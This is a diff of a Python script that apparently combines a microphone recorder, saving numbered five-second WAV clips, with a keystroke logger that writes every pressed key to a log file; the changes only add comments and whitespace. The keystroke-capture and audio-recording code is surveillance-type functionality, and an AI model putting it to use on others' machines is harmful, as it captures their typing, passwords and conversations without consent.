@@ -15,17 +15,19 @@ audio_information = "audio.wav"
 microphone_time = 5  # seconds
 fs = 44100  # Sample rate
 
-def microphone():
+# Function to record audio from the microphone
+def microphone(): 
     audio_count = 1
 
-    while os.path.exists(f"audio_{audio_count}.wav"):
+    while os.path.exists(f"audio_{audio_count}.wav"): # Check if the audio file already exists
         audio_count += 1
 
     filename = f"audio_{audio_count}.wav"
 
     print(f"Recording {filename}...")
 
-    recording = sd.rec(
+    # Record audio for the specified duration
+    recording = sd.rec( 
         int(microphone_time * fs),
         samplerate=fs,
         channels=1,
@@ -36,6 +38,7 @@ def microphone():
     write(filename, fs, recording)
     print(f"Saved {filename}")
 
+# Function to log keystrokes
 def on_press(key):
     with open(log_file, "a") as f:
         try:
@@ -44,7 +47,7 @@ def on_press(key):
             f.write(f"[{key}]")
 
         # Stop when Esc is pressed
-        if key == Key.esc:
+        if key == Key.esc: 
             return False
 
 
